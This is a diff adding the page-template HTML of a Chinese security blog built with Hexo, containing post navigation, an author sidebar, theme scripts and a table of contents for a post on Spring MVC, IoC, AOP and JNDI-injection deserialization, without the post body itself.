+              <a href="/2020/02/29/Myucms-2-1-SQL%E6%B3%A8%E5%85%A5%E5%8A%A0%E5%90%8E%E5%8F%B0getshell/" rel="next" title="Myucms 2.1 SQL注入加后台getshell">
+                <i class="fa fa-chevron-left"></i> Myucms 2.1 SQL注入加后台getshell
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/03/18/Confidence-CTF-2020-Web/" rel="prev" title="Confidence CTF 2020-Web">
+                Confidence CTF 2020-Web <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">离怀秋</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">72</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/lihuaiqiu" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://southseast.cc" title="南溟师傅" target="_blank">南溟师傅</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#SpringMVC基础知识"><span class="nav-number">1.</span> <span class="nav-text">SpringMVC基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Spring介绍"><span class="nav-number">1.1.</span> <span class="nav-text">Spring介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#spring调用的基本流程"><span class="nav-number">1.2.</span> <span class="nav-text">spring调用的基本流程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Spring-IoC思想"><span class="nav-number">2.</span> <span class="nav-text">Spring IoC思想</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#BeanFactory"><span class="nav-number">2.1.</span> <span class="nav-text">BeanFactory</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ApplicationContext"><span class="nav-number">2.2.</span> <span class="nav-text">ApplicationContext</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#主要区别"><span class="nav-number">2.3.</span> <span class="nav-text">主要区别</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#依赖注入-DI"><span class="nav-number">2.4.</span> <span class="nav-text">依赖注入(DI)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#setter方法的依赖注入"><span class="nav-number">2.4.1.</span> <span class="nav-text">setter方法的依赖注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#构造方法注入"><span class="nav-number">2.4.2.</span> <span class="nav-text">构造方法注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#集合注入"><span class="nav-number">2.4.3.</span> <span class="nav-text">集合注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Spring-AOP思想"><span class="nav-number">3.</span> <span class="nav-text">Spring AOP思想</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#手动实现AOP编程"><span class="nav-number">3.1.</span> <span class="nav-text">手动实现AOP编程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注解方式实现AOP"><span class="nav-number">3.2.</span> <span class="nav-text">注解方式实现AOP</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通过JNDI注入实现Spring-Framework反序列化"><span class="nav-number">4.</span> <span class="nav-text">通过JNDI注入实现Spring Framework反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞调用链分析"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞调用链分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考链接"><span class="nav-number">5.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">离怀秋</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count"></span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
